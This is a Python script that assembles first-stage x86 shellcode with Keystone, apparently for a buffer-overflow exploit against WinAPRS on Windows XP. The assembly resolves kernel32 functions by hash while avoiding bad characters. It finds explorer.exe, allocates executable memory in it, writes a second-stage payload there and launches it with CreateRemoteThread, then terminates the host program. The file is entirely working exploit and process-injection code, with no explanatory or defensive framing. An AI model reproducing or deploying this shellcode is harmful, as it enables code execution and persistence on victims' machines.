import ctypes, struct
from keystone import *

CODE = (
    " start: " #
    
    # ------------------------------------------------------
    # Adjust stack pointers
    # ------------------------------------------------------
    "    mov ebp, esp ;"
    "    add esp, 0xfffff9f0 ;"             # Avoiding NULL bytes ( sub esp, 0x610) - make room to store args/vars

    # ------------------------------------------------------
    # Fix pointers on stack that were overwritten (allows us to run Process32* functions)
    # ------------------------------------------------------
    " fix_data: "                   # Some structure data is overwritten by overflow. Can't call Process32* functions without this
    "    mov eax, esp ;"            # save ESP for later
    "    mov ebx, [0x7c8856d0] ;"   # Pointer to the structure I'm about to fix below (May be specific to XP SP3)
    "    add ebx, 0x24 ;"
    "    mov esp, ebx ;"
    "    xor ecx, ecx ;"
    "    push ecx ;"
    "    push 0x7ffb0222 ;"
    "    push ecx ;"
    "    push 0x7ffb021e ;"
    "    push ecx ;"
    "    mov edx, 0x7ffb011d ;"
    "    sub dx, 0x0101 ;"
    "    push edx ;"
    "    sub dx, 0x1a ;"
    "    push edx ;"
    "    push ecx ;"
    "    mov esp, eax ;"

    # ------------------------------------------------------
    # Build functions to help us find pointers to Kernel32 API methods
    # ------------------------------------------------------
    " find_kernel32: " #
    "    xor ecx, ecx ;"            # ECX = 0
    "    mov esi,fs:[ecx+30h] ;"    # ESI = &(PEB) ([FS:0x30])
    "    mov esi,[esi+0Ch] ;"       # ESI = PEB->Ldr
    "    mov esi,[esi+1Ch] ;"       # ESI = PEB->Ldr.InInitOrder

    " next_module: " #
    "    mov ebx, [esi+8h] ;"       # EBX = InInitOrder[X].base_address
    "    mov edi, [esi+20h] ;"      # EDI = InInitOrder[X].module_name
    "    mov esi, [esi] ;"          # ESI = InInitOrder[X].flink (next)
    "    cmp [edi+12*2], cx ;"      # (unicode) modulename[12] == 0x00?
    "    jne next_module ;"         # No: try next module.

    " find_function_shorten: "              #
    "    jmp find_function_shorten_bnc ;"   # Short jump
    " find_function_ret: "                  #
    "    pop esi ;"                         # POP the return address from the stack
    "    mov [ebp+0x04], esi ;"             # Save find_function address for later usage
    "    jmp resolve_symbols_kernel32 ;"    #
    " find_function_shorten_bnc: "          #
    "    call find_function_ret ;"          # Relative CALL with negative offset to avoid NULL bytes

    " find_function: "              #
    "    pushad ;"                      # Save all registers
                                        # Base address of kernel32 is in EBX from
                                        # Previous step (find_kernel32)
    "    mov eax, [ebx+0x3c] ;"         # Offset to PE Signature
    "    mov edi, [ebx+eax+0x78] ;"     # Export Table Directory RVA
    "    add edi, ebx ;"                # Export Table Directory VMA
    "    mov ecx, [edi+0x18] ;"         # NumberOfNames
    "    mov eax, [edi+0x20] ;"         # AddressOfNames RVA
    "    add eax, ebx ;"                # AddressOfNames VMA
    "    mov [ebp-4], eax ;"            # Save AddressOfNames VMA for later
    " find_function_loop: " #
    "    jecxz find_function_finished ;" # Jump to the end if ECX is 0
    "    dec ecx ;"                      # Decrement our names counter
    "    mov eax, [ebp-4] ;"             # Restore AddressOfNames VMA
    "    mov esi, [eax+ecx*4] ;"         # Get the RVA of the symbol name
    "    add esi, ebx ;"                 # Set ESI to the VMA of the current symbol name
    " compute_hash: " #
    "    mov eax, 0xffffffff ;"         # NULL EAX
    "    inc eax ;"
    "    cdq ;"                         # NULL EDX
    "    cld ;"                         # Clear direction
    " compute_hash_again: " #
    "    lodsb ;"                    # Load the next byte from esi (dll name) into al
    "    push ebx ;"                 # Save base addr of current module
    "    mov bl, al ;"               # Avoid bad char
    "    test al, bl ;"              # Check for NULL terminator
    "    pop ebx ;"                  # restore now
    "    jz compute_hash_finished ;" # If the ZF is set, we've hit the NULL term and end of string, else continue
    "    ror edx, 0x0d ;"            # Rotate edx 13 bits to the right
    "    add edx, eax ;"             # Add the new byte to the accumulator
    "    jmp compute_hash_again ;"   # Next iteration
    " compute_hash_finished: " # Intentionally blank, just a label for the end of the function
    " find_function_compare: " #
    "    cmp edx, [esp+0x24] ;"     # Compare the computed hash with the requested hash
                                    # 0x24 offset must point to pre-computed hash and may change
                                    # depending on how many push/pop instructions are in shellcode
    "    jnz find_function_loop ;"  # If it doesn't match go back to find_function_loop
    "    mov edx, [edi+0x24] ;"     # AddressOfNameOrdinals RVA
    "    add edx, ebx ;"            # AddressOfNameOrdinals VMA
    "    mov cx, [edx+2*ecx] ;"     # Extrapolate the function's ordinal
    "    mov edx, [edi+0x1c] ;"     # AddressOfFunctions RVA
    "    add edx, ebx ;"            # AddressOfFunctions VMA
    "    mov eax, [edx+4*ecx] ;"    # Get the function RVA
    "    add eax, ebx ;"            # Get the function VMA
    "    mov [esp+0x1c], eax ;"     # Overwrite stack version of eax from pushad
    " find_function_finished: " #
    "    popad ;"                   # Restore registers
    "    ret ;" #


    # ------------------------------------------------------
    # Resolve symbols for Kernel32 API methods
    # ------------------------------------------------------
    " resolve_symbols_kernel32: "
    "    push 0x78b5b983 ;"             # TerminateProcess hash
    "    call dword ptr [ebp+0x04] ;"   # Call find_function
    "    mov [ebp+0x10], eax ;"         # Save TerminateProcess address for later usage

    "    mov eax, 0xefe297c1 ;"
    "    dec eax ;"                     # 0xefe297c0 (0xc0 is bad char)
    "    push eax ;"                    # OpenProcess hash (0xefe297c0) 
    "    call dword ptr [ebp+0x04] ;"   # Call find_function
    "    mov [ebp+0x14], eax ;"         # Save address for later usage

    "    push 0x6e1a959c ;"             # VirtualAllocEx hash
    "    call dword ptr [ebp+0x04] ;"   # Call find_function
    "    mov [ebp+0x18], eax ;"         # Save address for later usage

    "    push 0xd83d6aa1 ;"             # WriteProcessMemory hash
    "    call dword ptr [ebp+0x04] ;"   # Call find_function
    "    mov [ebp+0x1c], eax ;"         # Save address for later usage

    "    push 0x72bd9cdd ;"             # CreateRemoteThread hash
    "    call dword ptr [ebp+0x04] ;"   # Call find_function
    "    mov [ebp+0x20], eax ;"         # Save address for later usage

    "    push 0xe454dfed ;"             # CreateToolhelp32Snapshot hash
    "    call dword ptr [ebp+0x04] ;"   # Call find_function
    "    mov [ebp+0x24], eax ;"         # Save address for later usage

    "    push 0x3249baa7 ;"             # Process32First hash
    "    call dword ptr [ebp+0x04] ;"   # Call find_function
    "    mov [ebp+0x28], eax ;"         # Save address for later usage

    "    push 0x4776654a ;"             # Process32Next hash
    "    call dword ptr [ebp+0x04] ;"   # Call find_function
    "    mov [ebp+0x2c], eax ;"         # Save address for later usage

    "    push 0x0ffd97fb ;"             # CloseHandle hash
    "    call dword ptr [ebp+0x04] ;"   # Call find_function

    # ------------------------------------------------------
    # Close COM port so it will work in stage 2
    # ------------------------------------------------------
    " call_CloseHandle: "               # Need to close COM port so stage 2 can use it
    "    mov ebx, [0x015df118] ;"       # On XP SP3 this seems to be a pointer to the COM port handle
    "    push ebx ;"                    # arg: hHandle
    "    call eax ;"                    # call CloseHandle

    # ------------------------------------------------------
    # Get explorer.exe PID
    # ------------------------------------------------------
    " call_CreateToolhelp32Snapshot: "
    "    xor ecx, ecx ;"
    "    push ecx ;"                    # arg: PID (null)
    "    add ecx, 0x02 ;"
    "    push ecx ;"                    # arg: dwFlags (TH32CS_SNAPPROCESS (0x02))
    "    call [ebp+0x24] ;"             # call CreateToolhelp32Snapshot
    "    mov [ebp+0x34], eax ;"         # save hSnapshot handle for later

    " call_Process32First: "            # Get first process in list (won't be explorer so don't bother checking)
    "    lea ebx, [ebp+0x40] ;"
    "    xor ecx, ecx ;"
    "    add cx, 0x130 ;"               # Must set dwSize of lppe before calling Process functions
    "    mov [ebp+0x40], ecx ;"
    "    push ebx ;"                    # arg: lppe - LPPROCESSENTRY32 structure (empty)
    "    push eax ;"                    # arg: hSnapshot
    "    call [ebp+0x28] ;"             # call Process32First

    " push_explorer: "                  # push string "explorer.exe" to stack for later comparison
    "    push 0x6578652e ;"             # ".exe"
    "    push 0x7265726f ;"             # "orer"
    "    push 0x6c707865 ;"             # "expl"
    "    mov edi, esp ;"                 # Pointer to "explorer.exe" is now in edi

    " call_Process32Next: "             # Check next process in list
    "    lea ebx, [ebp+0x40] ;"
    "    push ebx ;"                    # arg: lppe - LPPROCESSENTRY32 structure (empty)
    "    mov eax, [ebp+0x34] ;"
    "    push eax ;"                    # arg: hSnapshot
    "    call [ebp+0x2c] ;"             # call Process32Next
    "    xor ecx, ecx ;"

    " compare_loop: "                   # check result of Process32Next to see if it's explorer.exe
    "    mov edx, 0xbbcb2c01 ;"
    "    shr edx, 0x08 ;"               # 0x00bbcb2c = location of process executable filename in LPPROCESSENTRY32: "explorer.exe"
    "    mov esi, [edx+4*ecx] ;"        # Mov four chars from process filename into esi
    "    cmp esi, [edi+4*ecx] ;"
    "    jne call_Process32Next ;"      # Not explorer.exe, check the next process in list
    "    inc ecx ;"
    "    cmp ecx, 0x03 ;"
    "    jne compare_loop ;"            # After this point, we found explorer.exe

    " get_explorer_pid: "
    "    mov ecx, [ebx+8] ;"            # ebx points to LPPROCESSENTRY32 struct. EBX+8 = PID value

    # ------------------------------------------------------
    # Get handle to explorer.exe process
    # ------------------------------------------------------
    " call_OpenProcess: "               # Open explorer.exe process
    "    push ecx ;"                    # arg: dwProcessId
    "    xor edx, edx ;"                # NULL
    "    push edx ;"                    # arg: bInheritHandle (false)
    "    mov eax, 0x1f0fff01 ;"
    "    shr eax, 0x08 ;"               # 0x001f0fff (PROCESS_ALL_ACCESS)
    "    push eax ;"                    # arg: dwDesiredAccess
    "    mov [ebp+0x3c], ecx ;"         # Save counter value
    "    call dword ptr [ebp+0x14] ;"   # call OpenProcess
    "    mov [ebp+0x30], eax ;"         # save handle for later

    # ------------------------------------------------------
    # Allocate memory in explorer.exe to write stage 2
    # ------------------------------------------------------
    " call_VirtualAllocEx: "
    "    xor ecx, ecx ;"
    "    add ecx, 0x40 ;"
    "    push ecx ;"                    # arg: flProtect (PAGE_EXECUTE_READWRITE) 0x40
    "    add cx, 0x2fc1 ;"
    "    dec ecx ;"
    "    push ecx ;"                    # arg: flAllocationType (MEM_RESERVE) 0x3000
    #"    sub cx, 0x3002 ;"
    "    push ecx ;"                    # arg: dwSize (0x3000 bytes)
    "    xor edx, edx ;"
    "    push edx ;"                    # arg: lpAddress (NULL)
    "    push eax ;"                    # arg: hProcess (handle to identified process)
    "    call dword ptr [ebp+0x18] ;"   # Call VirtualAllocEx
    "    mov [ebp+0x0c], eax ;"         # save remote address for later

    # ------------------------------------------------------
    # Write stage 2 shellcode in explorer.exe
    # ------------------------------------------------------
    #" int3;"
    " call_WriteProcessMemory: "
    "    lea ecx, [ebp+0x08] ; "
    "    push ecx ;"                    # arg: lpNumberOfBytesWritten
    "    xor ecx, ecx ;"
    "    add cx, 0x0fff ;"
    "    push ecx ;"                    # arg: nSize (0x0fff)
    "    jmp get_eip ;"
    " jmp_back: "
    "    pop esi ;"                     # Pop return address (eip) into ESI
    "    jmp WPM_end ;"
    " get_eip:"
    "    call jmp_back ;"
    " WPM_end: "
    "    add esi, 0x67 ;"               # This offset depends on the number of shellcode bytes after this point
    "    push esi ;"                    # arg: lpBuffer (second stage shellcode)
    "    push eax ;"                    # arg: lpBaseAddress
    "    mov ebx, [ebp+0x30] ;"         # Retrieve saved process handle
    "    push ebx ;"                    # arg: hProcess

    # Next functions are used in stage 2 shellcode
    # Need to overwrite placeholder 0xffffffff values in stage 2 with real addresses
    "    mov ebx, 0x76057001 ;"         # CreateFileA import table address (0x00760570)
    "    shr ebx, 0x08 ;"
    "    mov ecx, [ebx] ;"
    "    mov [esi+0x0a], ecx ;"         # Overwrite placeholder in stage 2 shellcode

    "    add ebx, 0x10 ;"               # ReadFile import table addresss (0x00760580)
    "    mov ecx, [ebx] ;"
    "    mov [esi+0x12], ecx ;"         # Overwrite placeholder in stage 2 shellcode

    "    mov ebx, 0x76060801 ;"
    "    shr ebx, 0x08 ;"               # GetCommState import table address (0x00760608)
    "    mov ecx, [ebx] ;"
    "    mov [esi+0x1a], ecx ;"         # Overwrite placeholder in stage 2 shellcode

    "    add ebx, 0x04 ;"               # SetCommState import table address (0x0076060c)
    "    mov ecx, [ebx] ;"
    "    mov [esi+0x22], ecx ;"         # Overwrite placeholder in stage 2 shellcode

    "    mov ebx, 0x76057401 ;"         # CloseHandle import table address (0x00760574)
    "    shr ebx, 0x08 ;"
    "    mov ecx, [ebx] ;"
    "    mov [esi+0x2a], ecx ;"         # Overwrite placeholder in stage 2 shellcode

    "    mov ebx, eax ;"
    "    add bx, 0x1010 ;"              # Offset greater than the length of stage 2 shellcode
    "    mov [esi+0x32], ebx ;"         # Overwrite placeholder in stage 2 shellcode

    "    call dword ptr [ebp+0x1c] ;"   # call WriteProcessMemory

    # ------------------------------------------------------
    # Execute stage 2 shellcode inside explorer.exe
    # ------------------------------------------------------
    " call_CreateRemoteThread: "
    "    xor edx, edx ;"
    "    push edx ;"                    # arg: lpThreadId
    "    push edx ;"                    # arg: dwCreationFlags
    "    push edx ;"                    # arg: lpParameter
    "    mov eax, [ebp+0x0c] ;"         # retrieve remote address
    "    push eax ;"                    # arg: lpStartAddress
    "    push edx ;"                    # arg: dwStackSize (0x00010000) - need space for all three stages
    "    push edx ;"                    # arg: lpThreadAttributes
    "    mov eax, [ebp+0x30] ;"         # retrieve process handle
    "    push eax ;"                    # arg: hProcess
    "    call dword ptr [ebp+0x20] ;"   # call CreateRemoteThread

    # ------------------------------------------------------
    # Gracefully terminate WinAPRS
    # ------------------------------------------------------
    " exit: "
    "    xor ecx, ecx ;"
    "    push ecx ;"                    # arg: uExitCode
    "    push 0xffffffff ;"             # arg: hProcess
    "    call dword ptr [ebp+0x10] ;"   # call TerminateProcess
)

# Initialize engine in X86-32bit mode
try:
    ks = Ks(KS_ARCH_X86, KS_MODE_32)

    encoding, count = ks.asm(CODE)
    print("Encoded %d instructions..." % count)

    sh = b""
    for e in encoding:
        sh += struct.pack("B", e)
    shellcode = bytearray(sh)

    instructions = ""
    for dec in encoding:
        instructions += "\\x{0:02x}".format(int(dec)).rstrip("\n")

    print(instructions)
except KsError as e:
    print("ERROR: %s" %e)